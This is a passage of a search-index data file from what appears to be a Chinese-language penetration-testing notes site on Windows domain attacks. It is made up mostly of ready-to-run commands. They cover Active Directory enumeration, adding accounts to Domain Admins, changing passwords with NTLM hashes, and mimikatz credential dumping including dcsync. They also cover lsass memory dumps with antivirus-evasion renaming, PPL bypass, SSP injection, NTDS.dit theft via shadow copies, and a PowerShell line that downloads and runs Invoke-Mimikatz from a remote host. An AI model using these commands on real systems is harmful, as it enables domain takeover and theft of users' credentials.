\"CN=testa1a,cn=users,dc=abenson,dc=com\" -disabled no -pwd Aa123123 -pwdneverexpires yes -memberof \"cn=domain admins,cn=users,dc=abenson,dc=com\"","title":"\u6dfb\u52a0\u57df\u7528\u6237"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#hash","text":"\u66f4\u6539\uff0c\u975e\u57df\u5185\u6d4b\u8bd5\u4e0d\u6210\u529f lsadump::changentlm /server:192.168.52.100 /user:a1 /oldntlm:b660e61adc0aec1fe34711e6226fcc8c /newpassword:Aa123123.. \u6062\u590dhash\uff0c\u5982\u4e0d\u6210\u529f\u53ef\u591a\u66f4\u6539\u51e0\u6b21\u5bc6\u7801\u518d\u6062\u590d\uff0c\u4f46\u66f4\u6539\u5bc6\u7801\u6b21\u6570\u53d7\u9650\u4e8e\u6700\u77ed\u5bc6\u7801\u4f7f\u7528\u5929\u6570 lsadump::changentlm /server:192.168.52.100 /user:a1 /oldpassword:Aa123123.. /newntlm:b660e61adc0aec1fe34711e6226fcc8c","title":"\u901a\u8fc7\u7528\u6237hash\u66f4\u6539\u5bc6\u7801"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_14","text":"\u6307\u5b9a\u673a\u5668\u7684OU\uff0c\u6279\u91cf\u67e5\u627e \u75281.ps Get-UserLogon -all Get-UserLogon -ou 'ou=domain controllers,dc=exp,dc=exp'","title":"\u6839\u636e\u673a\u5668\u67e5\u627e\u767b\u5f55\u8fc7\u7684\u7528\u6237"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dn_1","text":"adfind -dn","title":"\u5bfc\u51faDN"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_15","text":"AdFind -sc computers_active name \u663e\u793a\u57df\u5185\u6240\u6709\u673a\u5668","title":"\u663e\u793a\u57df\u5185\u5728\u7ebf\u7684\u673a\u5668"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_16","text":"\u6301\u7eed\u76d1\u542c\u57df\u63a7\u7684\u65f6\u5019\u4f1a\u663e\u793a\u57df\u5185\u6240\u6709\u6700\u65b0\u7684\u767b\u5f55\u4fe1\u606f python3 netview.py exp1/administrator:Aa123123.. -targets ip","title":"\u5b9a\u4f4d\u57df\u7528\u6237\u7684\u673a\u5668"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_17","text":"net user\u3001net group\u8fd9\u79cd\u5e26net\u7684\u547d\u4ee4\uff0c\u5168\u90e8\u662f\u4ee5smb\u670d\u52a1\u7684samr\u534f\u8bae\u8fdb\u884c\u901a\u4fe1\u67e5\u8be2\u7684\u3002 net user /domain wmic /Namespace:\\\\root\\directory\\ldap path ds_user get ds_name,DS_distinguishedName,DS_userPrincipalName,DS_description,DS_memberOf \u8fd8\u53ef\u4ee5\u7528impacket\u7684samrdump\u67e5\u8be2 samrdump.py exp.com/cs:123456@10.0.2.5 -csv \u8fd8\u53ef\u4ee5\u7528ldapsearch\u901a\u8fc7ldap\u534f\u8bae\u67e5\u8be2 ldapsearch -x -h 10.0.2.254 -D \"cs@exp.com\" -b \"DC=exp,DC=com\" -w \"Aa123123.\" \"(&(objectCategory=person)(objectClass=user))\" \u8fd8\u53ef\u4ee5\u7528adfind\u67e5\u8be2 AdFind.exe -b dc=exp,dc=com -f \"(&(objectCategory=person)(objectClass=user))\" -dn","title":"\u57df\u5185\u7528\u6237\u6709\u8c01"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_18","text":"\u57df\u7528\u6237\u7684\u5b57\u6bb5\u6709\u59d3\u6709\u540d\u8fd8\u6709\u767b\u5f55\u540d\uff0c\u8fd9\u51e0\u4e2a\u662f\u53ef\u4ee5\u5f97\u8bbe\u7f6e\u4e0d\u4e00\u6837\u7684\uff0cOU\u6307\u5b9a\u7528\u6237\u7684\u7ec4 AdFind.exe -b \"CN=cs,OU=ceshi,DC=exp,DC=com\" displayName UserPrincipalName sAMAccountName","title":"\u57df\u7528\u6237\u7684\u767b\u5f55\u540d\u662f\u4ec0\u4e48"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_19","text":"AdFind -f \"objectcategory=person\" displayname company department name userprincipalname description","title":"\u5bfc\u51fa\u57df\u5185\u7528\u6237\u4fe1\u606f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_20","text":"adfind -users -rb CN=bba -dsq|admod -users -rb CN=\"Domain Admins\" -stdinadd member","title":"\u6dfb\u52a0\u8d26\u6237\u5230\u57df\u7ba1\u7ec4"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_21","text":"\u8fd9\u4e2a\u662f\u901a\u8fc7\u67e5\u627e\u57df\u7528\u6237\u76f8\u5173\u7684\u4e00\u4e9b\u65f6\u95f4\uff0c\u4f8b\u5982\u521b\u5efa\u65f6\u95f4\u3001\u5bc6\u7801\u66f4\u6539\u65f6\u95f4\u3001\u4e0a\u6b21\u767b\u5f55\u65f6\u95f4\u6765\u5224\u5b9a\u3002 AdFind.exe -b \"CN=cs,OU=ceshi,DC=exp,DC=com\" whencreated pwdlastset lastlogon -tdcs","title":"\u57df\u7528\u6237\u662f\u5426\u6d3b\u8dc3"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_22","text":"AdFind.exe -f \"useraccountcontrol:AND:=65536\" -bit -dn \u5173\u4e8euseraccountcontrol\u503c\u7684\u76f8\u5173\u5bf9\u5e94\u8868\u53c2\u7167\u6587\u672b","title":"\u5bc6\u7801\u6c38\u4e0d\u8fc7\u671f\u7684\u57df\u7528\u6237"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_23","text":"\u8fd9\u4e2a\u662f\u901a\u8fc7\u6307\u5b9a\u8fdc\u7a0bDC\u8fdb\u884c\u67e5\u8be2\u3002\u5982\u679c\u67e5\u627e\u6ca1\u6709\u7ed3\u679c\uff0c\u8bf4\u660e\u8fd9\u4e2a\u7528\u6237\u6ca1\u6709\u9650\u5236 AdFind.exe -h 10.0.2.254 -sc u:cs userWorkstations import-module .\\PowerView.ps1 Invoke-UserHunter -UserName AdministratorUser","title":"\u57df\u7528\u6237\u80fd\u591f\u767b\u5f55\u7684\u4e3b\u673a"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_24","text":"psloggedon.exe \\\\dc \u4f7f\u7528Powerview\u7684Invoke-UserHunter PVEFindADUser.exe -current netsess \\\\dc","title":"\u57df\u7528\u6237\u6b63\u5728\u767b\u9646\u7684\u4e3b\u673a"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#acl","text":"ADSI\u7f16\u8f91\u5668 adsiedit.msc \u67e5\u627e\u64f4\u5c55\u6b0a\u9650 AdFind.exe -b \"CN=Extended-Rights,CN=Configuration,DC=exp1,DC=com\" \u67e5\u627e\u5177\u6709\u67d0ACL\u7684\u5bf9\u8c61\uff0c\u5e76\u6839\u636eReplicating Directory Changes\u8fc7\u6ee4\uff0c\u67e5\u627e\u7528\u6237\u6216\u7ec4\u6216\u8ba1\u7b97\u673a Replicating Directory Changes\u662fdisplayName \u7528\u4ee5\u4e0b\u8bed\u53e5\u8fc7\u6ee4 AdFind.exe -b \"CN=Extended-Rights,CN=Configuration,DC=exp1,DC=com\" displayname -f\u6307\u5b9a\u503c\u8fdb\u884c\u8fc7\u6ee4 AdFind.exe -b \"CN=Extended-Rights,CN=Configuration,DC=exp1,DC=com\" -f \"rightsGuid=9b026da6-0d3c-465c-8bee-5199d7165cba\" DACL\u548cSACL\u5b58\u50a8\u5728nTSecurityDescriptor\u91cc\uff0c\u4ee5sddl\u683c\u5f0f\u5b58\u50a8\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u8bed\u53e5\u67e5\u8be2 AdFind.exe -b \"cn=administrator,cn=users,DC=exp1,DC=com\" nTSecurityDescriptor -sddl+++ \u8fd8\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u67e5\u8be2 adfind.exe -b \"cn=administrator,cn=users,dc=exp1,dc=com\" -sc getacl -sddlfilter adfind\u5bf9acl\u7684\u8fc7\u6ee4\u975e\u5e38\u7b80\u4fbf\uff0c\u53ea\u9700\u5728\u540e\u6dfb\u52a0\u8fc7\u6ee4\u7684\u6837\u4f8b\u5373\u53ef\u3002\u9700\u8981\u4ee5 ;;;;; \u8fc7\u6ee4\uff0c\u662f\u56e0\u4e3a\u8f93\u51fa\u7684\u683c\u5f0f\u5c31\u662f\u8fd9\u6837\uff0c\u4f8b\u5982\u6b63\u5e38\u8f93\u51fa\u5982\u4e0b nTSecurityDescriptor: [DACL] OBJ ALLOW;;[CTL];Change Password;;Everyone Change Password\u5728\u4e09\u4e2a\u5206\u53f7\u540e\uff0c\u4e24\u4e2a\u5206\u53f7\u524d\uff0c\u6240\u6709\u8981\u4ee5 ;;;change password;; \u8fc7\u6ee4\uff0c\u65e0\u89c6\u5927\u5c0f\u5199\uff0c\u53ef\u6a21\u7cca\u5339\u914d \u67e5\u627e\u662fadministrator\u7684reset password\u7684ace adfind.exe -b \"cn=administrator,cn=users,dc=exp1,dc=com\" -sc getacl -sddlfilter ;;;Reset Password;; AdFind.exe -b \"cn=administrator,cn=users,DC=exp1,DC=com\" nTSecurityDescriptor -sddl+++ \u4e0e adfind.exe -b \"cn=administrator,cn=users,dc=exp1,dc=com\" -sc getacl \u90fd\u53ef\u4ee5\u67e5\u8be2acl\uff0c\u4f46\u533a\u522b\u662f nTSecurityDescriptor \u4f1a\u663e\u793aDACL\u548cSACL\uff0c -sc getacl \u53ea\u663e\u793aDACL Nmap\u7684NSE\u811a\u672c smb-enum-sessions.nse\u83b7\u53d6\u57df\u5185\u4e3b\u673a\u7684\u7528\u6237\u767b\u5f55\u4f1a\u8bdd\uff0c\u67e5\u770b\u5f53\u524d\u662f\u5426\u6709\u7528\u6237\u767b\u5f55\u3002\u4e0b\u8f7d\u5730\u5740\uff1ahttps://nmap.org/nsedoc/scripts/smb-enum-sessions.html smb-enum-domains.nse\u5bf9\u57df\u63a7\u5236\u5668\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\uff0c\u53ef\u4ee5\u83b7\u53d6\u4e3b\u673a\u4fe1\u606f\u7528\u6237\u3001\u53ef\u4f7f\u7528\u5bc6\u7801\u7b56\u7565\u7684\u7528\u6237\u7b49\u3002 smb-enum-users.nse\u53ef\u4ee5\u4f7f\u7528\u6b64\u811a\u672c\u5bf9\u57df\u63a7\u8fdb\u884c\u626b\u63cf","title":"ACL\u67e5\u627e\u90e8\u5206"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_25","text":"AdFind.exe -b dc=exp1,dc=com -f \"(&(samAccountType=805306368)(msds-allowedtodelegateto=*))\" -dn AdFind.exe -f \"useraccountcontrol:AND:=524288\" -bit -dn","title":"\u7ea6\u675f\u59d4\u6d3e\u7528\u6237"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_26","text":"AdFind.exe -b dc=exp1,dc=com -f \"(&(samAccountType=805306368)(msds-allowedtodelegateto=*))\" -dn \u6216\u8005\u7528PowerSploit\u7684PowerView.ps1 Get-DomainUser \u2013TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl","title":"\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673a"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_27","text":"adfind AdFind.exe -b dc=exp1,dc=com -f \"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" -dn ldapsearch ldapsearch -x -H ldap://10.0.2.254:389 -D \"CN=cs,CN=Users,DC=exp,DC=com\" -w Aa123123. -b \"DC=exp,DC=com\" \"(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" |grep -iE \"distinguishedName\"","title":"\u975e\u7ea6\u675f\u59d4\u6d3e\u7528\u6237"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_28","text":"\u57df\u63a7\u90fd\u662f\u975e\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673a adfind AdFind.exe -b dc=exp1,dc=com -f \"(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" -dn ldapsearch ldapsearch -x -H ldap://10.1.1.1:389 -D \"CN=exp,CN=Users,DC=exp,DC=com\" -w password -b \"DC=exp,DC=com\" \"(&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" |grep -iE \"distinguishedName\"","title":"\u975e\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673a"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#spn","text":"setspn -Q */*","title":"\u67e5\u8be2SPN"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#nbt-ns","text":"nbtscan-1.0.35.exe -f 10.1.1.1 nbtscan-1.0.35-redhat-linux","title":"NBT-NS"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_29","text":"Snaffler.exe -s -o 1.log SharpShares.exe ips SharpShares.exe shares","title":"\u5171\u4eab\u6587\u4ef6\u5939\u53d1\u73b0"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#windump","text":"\u4f7f\u7528\u524d\u5148\u786e\u5b9a\u7f51\u5361 WinDump.exe -i 1 -w 1.pcap -s 0 \u8c61\u5f81\u6027\u5730\uff0c\u53ef\u4ee5\u4f7f\u7528Pcredz\u5feb\u901f\u83b7\u53d6\u654f\u611f\u5bc6\u7801\u3002\u56e0\u4e3a\u5b9e\u9645\u6d4b\u8bd5\u4e2d\uff0chttp\u7684body\u90fd\u65e0\u6cd5\u53d1\u73b0","title":"\u4f7f\u7528windump\u76d1\u542c\u7f51\u7edc\u6570\u636e\u5305"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#bypsss","text":"","title":"Bypsss\u7684\u4fe1\u606f\u641c\u96c6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#csvde","text":"","title":"\u4f7f\u7528csvde"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_30","text":"\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a csvde -f all.csv \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a csvde -f user.csv -r \"(&(objectCategory=person))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a csvde -f machine.csv -r \"(&(objectCategory=computer))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a csvde -f group.csv -r \"(&(objectCategory=group))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a csvde -f admin.csv -r \"(&(objectCategory=group)(name=Domain Admins))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a csvde -f ou.csv -r \"(&(objectCategory=organizationalUnit))\" \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a csvde -f username.csv -r \"(&(objectCategory=person))\" -l SamAccountName \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a csvde -f machinename.csv -r \"(&(objectCategory=computer))\" -l name","title":"\u672c\u5730"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_31","text":"\u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a csvde -s 192.168.1.1 -a test\\admin Password -f all.csv","title":"\u8fdc\u7a0b"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ldifde","text":"","title":"\u4f7f\u7528ldifde"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_32","text":"\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a ldifde -f all.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=person))\" -f user.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=computer))\" -f machine.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=group))\" -f group.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=group)(name=Domain Admins))\" -f admin.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a ldifde -r \"(&(objectCategory=organizationalUnit))\" -f ou.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a ldifde -r \"(&(objectCategory=person))\" -l SamAccountName -f username.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a ldifde -r \"(&(objectCategory=computer))\" -l name -f machinename.txt","title":"\u672c\u5730"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_33","text":"\u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a ldifde -s 192.168.1.1 -a test\\admin Password -f all.txt","title":"\u8fdc\u7a0b"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#adfind","text":"","title":"\u4f7f\u7528AdFind"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_34","text":"\u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1>all.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7528\u6237\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=person>user.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u673a\u5668\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=computer>machine.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ec4\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=group>group.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7ba1\u7406\u5458\u7ec4\u7684\u7528\u6237\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f \"(&(objectCategory=group)(name=Domain Admins))\">admin.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709OU\u4fe1\u606f\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=organizationalUnit>ou.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u57df\u7528\u6237\u540d\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=person SamAccountName>username.txt \u5bfc\u51fa\u5f53\u524d\u57df\u5185\u6240\u6709\u7684\u8ba1\u7b97\u673a\u540d\uff1a adfind.exe -h 127.0.0.1 -f objectcategory=computer name>machinename.txt","title":"\u672c\u5730"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_35","text":"\u5bfc\u51fa\u8fdc\u7a0b\u57df\u5185\u6240\u6709\u4fe1\u606f\uff1a adfind.exe -h 192.168.1.1 -u test\\admin -up Password>all.txt","title":"\u8fdc\u7a0b"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_36","text":"","title":"\u653b\u51fb\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_37","text":"","title":"\u5bc6\u7801\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_38","text":"","title":"\u8bfb\u5bc6\u7801"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#meterpreter","text":"meterpreter > hashdump meterpreter > load mimikatz meterpreter > msv #\u8bfb\u7684\u662fhash meterpreter > ssp #\u8bfb\u7684\u662f\u660e\u6587 meterpreter > wdigest #\u8bfb\u7684\u662f\u660e\u6587","title":"meterpreter\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#mimikatz","text":"sekurlsa\u53ef\u7528\u7684\u8fd8\u6709msv\u3001wdigest\u3001kerberos\u3001tspkg\u3001ssp\u3001logonPasswords\u3001ekeys\u7b49 mimikatz.exe \"privilege::debug\" \"log 1.txt\" \"sekurlsa::logonpasswords\" exit mimikatz.exe privilege::debug \"lsadump::dcsync /domain:test.com /all /csv\" exit \u8fd8\u6709PowerSploit\u7684 powershell \"IEX (New-Object Net.WebClient).DownloadString('http://xx/xx'); Invoke-Mimikatz -DumpCreds\"","title":"mimikatz\u65b9\u5f0f"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#lsass","text":"","title":"\u8bfb\u53d6lsass"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#procdumpmimikatz","text":"\u7ed5\u6740\u6bd2 \u5c06procdump.exe\u79fb\u52a8\u4e00\u4e0b\u76ee\u5f55\u5e76\u91cd\u547d\u540d C:\\Program Files (x86)\\Microsoft Visual Studio\\dump64.exe procdump64.exe -accepteula -ma lsass.exe lsass.dmp mimikatz.exe \"log res.log\" \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonPasswords full\" exit","title":"procdump\u7ec4\u5408mimikatz"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#avdumpexe","text":".\\AvDump.exe --pid <lsass pid> --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\\Users\\admin\\Desktop\\lsass.dmp --min_interval 0","title":"AvDump.exe"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dotnet-dumpexe","text":"\u5177\u6709\u5fae\u8f6f\u7b7e\u540d\u7684dump\u5de5\u5177 dotnet-dump.exe collect -p <lsass pid>","title":"dotnet-dump.exe"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#createdumpexe","text":"createdump.exe -u -f lsass.dmp <lsass pid>","title":"CreateDump.exe"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#rundll32exe","text":"rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id C:\\Users\\admin\\Desktop\\lsass-comsvcs.dmp full","title":"Rundll32.exe"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ppldump","text":"PPL\u662f\u5fae\u8f6f\u7684\u4e00\u79cd\u8fdb\u7a0b\u4fdd\u62a4\u673a\u5236\uff0c\u5982\u679cLSA\u5f00\u542f\u4e86PPL\u4fdd\u62a4\uff0c\u90a3\u4e48\u7528\u5e38\u89c4\u624b\u6bb5\u662f\u65e0\u6cd5\u6293\u5230\u5bc6\u7801\u7684 \u67e5\u8be2\u662f\u5426\u5f00\u542f\u4e86PPL reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL \u4f7f\u7528mimikatz\u7ed5\u8fc7\uff0c\u9700\u8981\u843d\u5730\u6587\u4ef6\u6765\u6267\u884c\uff0c\u4e14mimikatz\u6570\u5b57\u7b7e\u540d\u4e0d\u80fd\u88ab\u4fee\u6539 !+ !processprotect /process:lsass.exe /remove privilege::debug sekurlsa::logonpasswords \u6293\u5b8c\u518d\u6062\u590d !processprotect /process:lsass.exe !- \u4f7f\u7528\u5f00\u6e90\u5de5\u5177\u7ed5\u8fc7 PPLKiller PPLcontrol EDRSandblast PPLdump PPLmedic PPLFault \u6700\u65b0","title":"\u7ed5\u8fc7PPL\u673a\u5236dump"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_39","text":"reg save hklm\\sam sam.hive reg save hklm\\system system.hive mimikatz.exe \"log res.log\" \"lsadump::sam /sam:sam.hive /system:system.hive\" exit","title":"\u6ce8\u518c\u8868\u5bfc\u51fa\u672c\u5730\u8bfb\u53d6"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ssp","text":"\u6b64\u65b9\u5f0f\u9700\u8981\u7ba1\u7406\u4eba\u5458\u4ea4\u4e92\u64cd\u4f5c\u3002\u5b9e\u73b0\u6548\u679c\u5c31\u662f\u7ba1\u7406\u4eba\u5458\u8f93\u5165\u5bc6\u7801\u540e\uff0c\u5bc6\u7801\u4f1a\u88ab\u660e\u6587\u8bb0\u5f55\u5728\u78c1\u76d8\u4e0a\uff0c\u867d\u7136\u6709\u70b9\u50cf\u662f\u9493\u9c7c\uff0c\u4f46\u6280\u672f\u5b9e\u73b0\u5e76\u975e\u9493\u9c7c\u3002","title":"SSP\u6ce8\u5165\u83b7\u53d6\u5bc6\u7801"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dll","text":"\u5c06mimilib.dll\u590d\u5236\u5230system32\u4e0b\uff0c\u4fee\u6539\u6ce8\u518c\u8868 reg add \"hklm\\system\\currentcontrolset\\control\\lsa\\\" /v \"Security Packages\" /d \"kerberos\\0msv1_0\\0schannel\\0wdigest\\0tspkg\\0pku2u\\0mimilib\" /t REG_MULTI_SZ","title":"DLL\u6ce8\u5165"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_40","text":"privilege::debug misc::memssp","title":"\u5185\u5b58\u6ce8\u5165"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ntds","text":"\u521b\u5efaNTDS\u5feb\u7167 ntdsutil \"activate instance ntds\" \"ifm\" \"create full C:\\Windows\\Temp\\NTDS\" quit quit \u590d\u5236C\u76d8\u5f71\u5377\u526f\u672c vssadmin create shadow /for=C: \u5377\u5f71\u526f\u672c ID: {bbce8208-3ed9-4164-8022-72a59e54002a} \u5377\u5f71\u526f\u672c\u5377\u540d: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2 \u5229\u7528\u590d\u5236\u51fa\u6765\u7684\u5377\u540d\u5c06NTDS\u5feb\u7167\u590d\u5236\u51fa\u6765 copy $ShadowCopyName\\Windows\\NTDS\\NTDS.dit C:\\Windows\\Temp\\ntds.dit.save \u5229\u7528impacket\u89e3 secretsdump -ntds ntds.dit.save -system system.save 